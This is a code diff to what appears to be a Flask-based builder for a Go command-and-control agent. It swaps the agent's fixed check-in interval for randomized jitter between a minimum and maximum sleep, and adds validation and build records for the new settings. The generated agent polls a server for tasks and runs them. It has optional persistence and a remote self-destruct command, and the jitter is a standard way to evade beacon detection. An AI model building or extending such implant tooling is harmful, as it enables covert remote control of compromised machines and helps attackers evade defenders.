@@ -332,10 +332,8 @@ def _sanitize_interval(interval_str):
     return interval_str.strip()
 
 
-def _generate_config_go(server_url, interval, persistence):
+def _generate_config_go(server_url, jitter_min, jitter_max, persistence):
     """Generate a config.go file with the given settings."""
-    persist_import = ""
-    persist_call = ""
 
     return f'''package main
 
@@ -350,10 +348,11 @@ import (
 // ─── Configuration ───
 
 var (
-\tServerURL       = "{server_url}"
-\tCheckInInterval = {interval} * time.Second
-\tAgentID         string
-\tEnablePersist   = {str(persistence).lower()}
+\tServerURL     = "{server_url}"
+\tJitterMin     = {jitter_min} * time.Second
+\tJitterMax     = {jitter_max} * time.Second
+\tAgentID       string
+\tEnablePersist = {str(persistence).lower()}
 )
 
 func generateUUID() string {{
@@ -372,7 +371,7 @@ func InitConfig() {{
 \tfmt.Println("═══════════════════════════════════════")
 \tfmt.Printf("  Agent ID  : %s\\n", AgentID)
 \tfmt.Printf("  Server    : %s\\n", ServerURL)
-\tfmt.Printf("  Interval  : %s\\n", CheckInInterval)
+\tfmt.Printf("  Jitter    : %s – %s\\n", JitterMin, JitterMax)
 \tfmt.Printf("  OS/Arch   : %s/%s\\n", runtime.GOOS, runtime.GOARCH)
 
 \thostname, err := os.Hostname()
@@ -387,7 +386,6 @@ func InitConfig() {{
 
 def _generate_main_go(persistence):
     """Generate main.go, optionally with persistence call."""
-    persist_import = '\n\t"c2-agent/funcs"' if not persistence else '\n\t"c2-agent/funcs"'
     persist_block = ""
     if persistence:
         persist_block = """
@@ -412,7 +410,6 @@ import (
 \t"os"
 \t"runtime"
 \t"strings"
-\t"time"
 
 \t"c2-agent/funcs"
 )
@@ -444,13 +441,13 @@ func main() {{
 \thostname, _ := os.Hostname()
 \tagentOS := runtime.GOOS
 
-\tfmt.Printf("\\n[*] Starting check-in loop (every %s)…\\n\\n", CheckInInterval)
+\tfmt.Printf("\\n[*] Starting check-in loop (jitter: %s \u2013 %s)\u2026\\n\\n", JitterMin, JitterMax)
 
 \tfor {{
 \t\ttasks, err := checkIn(hostname, agentOS)
 \t\tif err != nil {{
 \t\t\tfmt.Printf("[!] Check-in failed: %v\\n", err)
-\t\t\ttime.Sleep(CheckInInterval)
+\t\t\tfuncs.SleepWithJitter(JitterMin, JitterMax)
 \t\t\tcontinue
 \t\t}}
 
@@ -461,7 +458,7 @@ func main() {{
 
 \t\t\tif task.Command == "__selfdestruct__" {{
 \t\t\t\tfmt.Println("[!] Self-destruct command received from server!")
-\t\t\t\t_ = sendResult(task.ID, "Self-destruct acknowledged. Agent wiping…")
+\t\t\t\t_ = sendResult(task.ID, "Self-destruct acknowledged. Agent wiping\u2026")
 \t\t\t\tfuncs.SelfDestruct()
 \t\t\t}}
 
@@ -513,7 +510,7 @@ func main() {{
 \t\t\t}}(task)
 \t\t}}
 
-\t\ttime.Sleep(CheckInInterval)
+\t\tfuncs.SleepWithJitter(JitterMin, JitterMax)
 \t}}
 }}
 
@@ -595,7 +592,8 @@ def build_agent():
     target_os = data.get("target_os", "windows")
     arch = data.get("arch", "amd64")
     server_url = data.get("server_url", "http://localhost:5000")
-    interval_raw = data.get("interval", "10")
+    jitter_min_raw = data.get("jitter_min", "8")
+    jitter_max_raw = data.get("jitter_max", "15")
     persistence = data.get("persistence", False)
 
     # Validate target OS
@@ -608,13 +606,24 @@ def build_agent():
     if arch not in valid_arch:
         return jsonify({"error": f"Invalid arch. Must be one of: {valid_arch}"}), 400
 
-    # Parse interval (just the number, we'll add the Go duration unit)
+    # Parse jitter_min
     try:
-        interval_seconds = int(interval_raw)
-        if interval_seconds < 1 or interval_seconds > 3600:
-            return jsonify({"error": "Interval must be between 1 and 3600 seconds"}), 400
+        jitter_min = int(jitter_min_raw)
+        if jitter_min < 1 or jitter_min > 3600:
+            return jsonify({"error": "jitter_min must be between 1 and 3600 seconds"}), 400
     except ValueError:
-        return jsonify({"error": "Interval must be a number (seconds)"}), 400
+        return jsonify({"error": "jitter_min must be a number (seconds)"}), 400
+
+    # Parse jitter_max
+    try:
+        jitter_max = int(jitter_max_raw)
+        if jitter_max < 1 or jitter_max > 3600:
+            return jsonify({"error": "jitter_max must be between 1 and 3600 seconds"}), 400
+    except ValueError:
+        return jsonify({"error": "jitter_max must be a number (seconds)"}), 400
+
+    if jitter_min >= jitter_max:
+        return jsonify({"error": "jitter_min must be less than jitter_max"}), 400
 
     # Validate server URL
     if not server_url.startswith("http://") and not server_url.startswith("https://"):
@@ -634,7 +643,7 @@ def build_agent():
         shutil.copytree(agent_src, tmp_agent)
 
         # Generate custom config.go
-        config_content = _generate_config_go(server_url, interval_seconds, persistence)
+        config_content = _generate_config_go(server_url, jitter_min, jitter_max, persistence)
         with open(os.path.join(tmp_agent, "config.go"), "w", encoding="utf-8") as f:
             f.write(config_content)
 
@@ -687,7 +696,7 @@ def build_agent():
         conn = get_db_connection()
         cursor = conn.execute(
             "INSERT INTO builds (filename, target_os, arch, server_url, callback_interval, persistence, file_path, file_size) VALUES (?, ?, ?, ?, ?, ?, ?, ?)",
-            (filename, target_os, arch, server_url, f"{interval_seconds}s", 1 if persistence else 0, final_path, file_size),
+            (filename, target_os, arch, server_url, f"{jitter_min}s-{jitter_max}s", 1 if persistence else 0, final_path, file_size),
         )
         build_id = cursor.lastrowid
         conn.commit()
